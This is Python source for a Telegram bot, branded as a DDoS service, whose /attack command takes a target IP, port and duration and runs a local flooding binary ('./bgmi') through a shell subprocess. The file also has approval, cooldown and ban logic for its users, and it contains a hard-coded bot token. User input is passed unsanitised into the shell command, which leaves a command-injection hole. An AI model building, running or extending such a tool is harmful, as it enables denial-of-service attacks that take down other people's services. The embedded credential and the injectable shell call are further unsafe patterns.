import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta
from collections import defaultdict

TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'  # Replace with your bot token
ADMIN_USER_ID = 1662672529  # Replace with your admin user ID
APPROVED_IDS_FILE = 'approved_ids.txt'
attack_in_progress = False
user_attack_count = defaultdict(int)
user_attack_times = defaultdict(list)
user_ban_status = {}
cooldown_time = 10  # Cooldown in seconds (2 minutes)
max_attacks_per_hour = 4  # Max 4 attacks per hour
duration_limit = 180  # Maximum attack duration in seconds
ban_duration = 10  # Ban duration in minutes
last_attack = defaultdict(set)

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*👿 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒 👿*\n\n"
        "*/help - Show this help message*\n"
        "*OWNER :- @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Help command
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*Commands:* \n"
        "/start - Welcome message\n"
        "/approve <id> - Approve a user or group (admin only)\n"
        "/remove <id> - Remove a user or group (admin only)\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only)\n"
        "/check - List all users who have used the bot\n"
        "/warnall - Send feedback request to all users\n"
        "/dismiss <id> - Unban a user (admin only)\n"
        "/help - Show this help message"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# Attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    now = datetime.now()

    # Check if user is approved
    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Check if user is banned
    if user_ban_status.get(user_id, False):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You are banned for {ban_duration} minutes.*", parse_mode='Markdown')
        return

    # Check attack limits (max 4 attacks per hour)
    if len(user_attack_times[user_id]) >= max_attacks_per_hour:
        first_time = user_attack_times[user_id][0]
        if now - first_time < timedelta(hours=1):
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ You can only use /attack 4 times per hour.*", parse_mode='Markdown')
            return
        else:
            user_attack_times[user_id].pop(0)  # Remove outdated attack times

    # Check cooldown (2 minutes between attacks)
    if user_attack_count[user_id] > 0 and (now - user_attack_times[user_id][-1]).seconds < cooldown_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the attack to finish before using /attack again.*", parse_mode='Markdown')
        return

    # Validate attack command format
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args

    if int(time) > duration_limit:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum allowed duration is {duration_limit} seconds.*", parse_mode='Markdown')
        return

    # Prevent consecutive attacks on the same IP and port
    if (ip, port) in last_attack[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You cannot attack the same IP and port consecutively.*", parse_mode='Markdown')
        return

    # Log the attack
    user_attack_times[user_id].append(now)
    user_attack_count[user_id] += 1
    last_attack[user_id].add((ip, port))

    # Check if the user has used the attack command 4 times in a short period (ban them)
    if user_attack_count[user_id] >= 4:
        user_ban_status[user_id] = True
        user_attack_count[user_id] = 0  # Reset attack count after banning
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You have been banned for {ban_duration} minutes due to spamming attacks.*", parse_mode='Markdown')

        # Wait for the ban duration before lifting the ban
        await asyncio.sleep(ban_duration * 60)  # Ban for 10 minutes
        user_ban_status[user_id] = False
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ You have been unbanned after {ban_duration} minutes.*", parse_mode='Markdown')

    # Proceed with the attack
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n\n"
        f"*👙Target » {ip}*\n"
        f"*🎯 Port » {port}*\n"
        f"*⏳ Time » {time} seconds*\n"
        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
    ), parse_mode='Markdown')

    # Trigger the attack in a separate task
    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

# Run attack
async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')

# Check command
async def check(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    users = "\n".join(f"ID: {user}, Username: {context.bot.get_chat(user).username}" for user in user_attack_times)
    await context.bot.send_message(chat_id=chat_id, text=f"*Users:* \n{users}", parse_mode='Markdown')

# Warnall command
async def warnall(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    for user in user_attack_times.keys():
        await context.bot.send_message(chat_id=user, text="*Send feedback to owner: @GODxAloneBOY*", parse_mode='Markdown')

# Dismiss command
async def dismiss(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /dismiss <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    user_ban_status[target_id] = False
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} has been unbanned.*", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("warnall", warnall))
    application.add_handler(CommandHandler("dismiss", dismiss))
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == '__main__':
    main()
